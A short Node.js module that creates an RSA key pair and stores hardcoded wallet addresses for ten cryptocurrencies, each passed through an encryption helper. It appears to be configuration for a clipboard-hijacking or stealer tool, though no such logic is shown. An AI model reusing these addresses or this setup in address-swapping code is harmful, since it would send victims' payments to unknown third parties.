module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),

        btc: client.utils.encryption.encryptData("bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta"),
        ltc: client.utils.encryption.encryptData("LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut"),
        xmr: client.utils.encryption.encryptData("4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS"),
        eth: client.utils.encryption.encryptData("0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E"),
        xrp: client.utils.encryption.encryptData("rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"),
        neo: client.utils.encryption.encryptData("ANn5THmQidTh6zENyCytJV98i6po1dLJhh"),
        bch: client.utils.encryption.encryptData("qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j"),
        doge: client.utils.encryption.encryptData("DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6"),
        dash: client.utils.encryption.encryptData("Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR"),
        xlm: client.utils.encryption.encryptData("GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG"),
    }
}